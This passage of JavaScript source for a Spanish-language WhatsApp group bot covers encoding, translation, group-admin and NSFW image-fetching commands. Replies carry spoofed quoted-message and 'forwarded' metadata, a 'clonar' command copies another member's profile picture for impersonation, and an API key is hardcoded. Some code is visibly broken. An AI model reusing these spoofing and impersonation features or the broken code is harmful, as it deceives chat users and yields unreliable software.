hasil = `${teksa}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
samu330.sendMessage(from, hasil, text, {
quoted: fimg
})
break
		   
case 'online':
if (!isGroup) return reply(mess.only.group)
let msg = `[ List Online ]\n`
from.filter(chat.presence.chatstates, (n) => !!n?.type).forEach(item => {
msg += `- @${item.id.replace(/@c\.us/g, '')}\n`
})
msg += '[ NyanBot ]'
await reply(msg)
break
case 'soyyo':
if (!isRegister) return reply(mess.only.usrReg)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
nombredelwe = wa.getUserName(sender)
teks = `‣ *Nombre* : ${nombredelwe}
‣ *Número* : ${sender.split("@")[0]}
‣ *Link* : wa.me/${sender.split("@")[0]}`
its = await getBuffer (ppimg)
samu330.sendMessage(from, its, image, {
quoted: fliveLoc, caption: teks, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})

break
case 'pastebin':
if (args.length < 1) return reply('Escribe el texto que se mostrara en pastebin.')
paste = `${args.join(' ')}`
reply(mess.wait)
anu = await getJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${paste}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'abinario':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo binario.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'binatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo binario para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'aoctal':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo octal.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'octalatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo octal para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break


case 'ahex':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo hex.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'hexatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo hex para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, MessageType.text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'tourl':
if (!isRegister) return reply(mess.only.userB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !samu.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(samu).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
reply(mess.wait)
owgi = await samu330.downloadAndSaveMediaMessage(ger)
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
teks = `${anu.display_url}`
reply(teks)
}
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
porn = await getJson('https://meme-api.herokuapp.com/gimme/lesbians', {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
fimg})
break

case 'tetas':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/tits",
"https://meme-api.herokuapp.com/gimme/BestTits",
"https://meme-api.herokuapp.com/gimme/boobs",
"https://meme-api.herokuapp.com/gimme/amazingtits",
"https://meme-api.herokuapp.com/gimme/TinyTits"]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break

case 'ass':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/CuteLittleButts",
"https://meme-api.herokuapp.com/gimme/ass",
"https://meme-api.herokuapp.com/gimme/boobs",
"https://meme-api.herokuapp.com/gimme/ass"]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break
//Esta funcion fue creada gracias a la api de fxc-7
case 'porno':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pornito = ["https://fxc7-api.herokuapp.com/api/amateur?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal_gape?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/asian?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass-fucking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/japanese?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/babe?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ball_licking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/bath?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal_penetration?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/areolae?apikey=Fxc7"]
nopor = pornito[Math.floor(Math.random() * pornito.length)]
reply('*Espera un momento porfavor*')
iwant = await getJson(`${nopor}`, {method: 'get'})
you = await getBuffer(`${iwant.result}`)
sendFile(you, sam, '🍒')
break
		
case 'pdf':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
reply('*Espera un momento....*')
pdf = await getJson(`https://api.lolhuman.xyz/api/nhentaipdf/344253?apikey=${api}`)
sendFileFromUrl(pdf.result, document, {quoted: ftoko, mimetype: 'application/pdf'})
break


case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/pussy",
"https://meme-api.herokuapp.com/gimme/LegalTeens"
]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break

case 'simi':

samu330.updatePresence(from, Presence.composing)
texto = body.slice(5)
sim = await getJson(`https://api.simsimi.net/v1/?text=${texto}&lang=es`)
smuu = (`${sim.success}`)
samu330.sendMessage(from, smuu, MessageType.text, {quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/simi.jpg`)
},
"title": `➫𝐒𝐢𝐦𝐬𝐢𝐦𝐢 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲🔥❣️`,
"description": `${texto}`,
"currencyCode": '',
"priceAmount1000": "999999999999999999999",
"retailerId": 'TOM',
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
})

break
case 'emoji':

if (args.length == 0) return reply(`Ejemplo: ${prefix + command} 😭`)
emoji = args[0]
try {
emoji = encodeURIComponent(emoji[0])
} catch {
emoji = encodeURIComponent(emoji)
}
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${api}`)
await samu330.sendMessage(from, ini_buffer, sticker, { quoted: ftoko })
break

case 'chat':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var pc = budy.slice(6)
var nomor = pc.split("|")[0];
var org = pc.split("|")[1];
samu330.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)
reply(`*El memsaje:* ${org} *Se envio a:* ${nomor}`)
break
case 'setpic':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.updatePresence(from, Presence.composing)
if (!isQuotedImage) return reply(`Envia una imagen con el comando: *${prefix}setpp*`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
await samu330.updateProfilePicture(meNumber, media2)
reply('*Yap*')
break

case 'kick':
case 'eliminar':
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)
if (!botAdmin) return reply(mess.only.Badmin)
                if (sam.message.extendedTextMessage != undefined){
                mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
		if (!mentioned) return reply(`exampol xd: ${prefix + command} @participante... o etiqueta el mensaje de la persona a eliminar`)
		await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
		if (mentionUser.length == 1)
		samu330.groupRemove(from, mentionUser)
		//samu330.groupRemove(from, mentioned)
		} else {
	        await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
		samu330.groupRemove(from, mentioned)
		}
		break

case 'wpsearch':

if (args.length == 0) return reply(`Example: ${prefix + command} gatos`)
query = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${api}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await samu330.sendMessage(from, ini_buffer, image, { quoted: ftoko })

break

case 'translate':
if (args.length == 0) return reply(`Example: ${prefix + command} es Hi bro`)
idioma = args[0]
args.shift()
ini_txt = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/translate/auto/${idioma}?apikey=${api}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `Traduccion de : ${get_result.from}\n`
init_txt += `a : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Traducido : ${get_result.translated}\n`
init_txt += `Pronunciacion : ${get_result.pronunciation}\n`
reply(init_txt)

break
case 'ping':
var groups = samu330.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = samu330.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
const timestamp = speed();
const totalChat = await samu330.chats.all()
const latensi = speed() - timestamp
//	const total12 = math(`${groups.length}*${privat.length}`)
teks = `_Pong_ xD\n*ESTADISTICAS DEL BOT:*\n*- Group Chats :* ${groups.length}\n*- Private Chats :* ${privat.length}\n*- Total Chats :* ${totalChat.length}\n*- Speed :* ${latensi.toFixed(4)} _Second_\n*- Active Time :* ${uptime}\n\n*PHONE STATISTICS:*\n*- 📱Capacidad de Ram :* ${ram2}\n*- 💻Plataforma :* ${os.platform()}\n*- 🌐Hostname :* ${os.hostname()}\n*- 🕐Uptime :* ${os.uptime()}\n*- 🪀Wa Version:* ${samu330.user.phone.wa_version}\n*- 📡Os Version:* ${samu330.user.phone.os_version}\n*- 🔐Device Manufacturer:* ${samu330.user.phone.device_manufacturer}\n*- 📲Device Model:* ${samu330.user.phone.device_model}\n*- 🧬Os Build Number:* ${samu330.user.phone.os_build_number}\n${os.loadavg()}\n${os.networkInterfaces()}`
samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'clonar':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Etiqueta a alguien para utilizar su foto!!!')
if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply('Etiqueta a alguien')
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
let {jid, id1, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await samu330.getProfilePicture(id)
buffer = await getBuffer(pp)
samu330.updateProfilePicture(botNumber, buffer)
mentions(`La foto de perfil se actualizó correctamente con la foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply(mess.ferr)
}

break
case 'queanime':
if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
reply(mess.wait)
const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const mediaa = await samu330.downloadMediaMessage(encmediaa)
await wait(mediaa).then(res => {
samu330.sendMessage(from, res.video, video, { quoted: ftoko, caption: res.teks.trim() })
}).catch(err => {
reply(err)
})
} else {
reply('Envia la magen para poder buscar el anime')
}
break
case 'colores':
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const attp1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
samu330.sendMessage(from, attp1, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
		

case 'añadir':
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Y el numero?')
if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
samu330.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
}
break

case 'public':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (public) return await reply('*El modo publico Ya esta activado*')
config["public"] = true
public = true
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se activo el modo publico*", "Public : true")
break
case 'self':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!public) return await reply('El modo privado ya estaba activado')
config["public"] = false
public = false
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se a cambiado a modo PRIVADO*", "Self : true")
break
case 'bc':
if (!isOwner) return reply('Solo *Samu* puede usar este comando')
if (args.length < 1) return reply('Y el anuncio?')
anu = await samu330.chats.all()
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
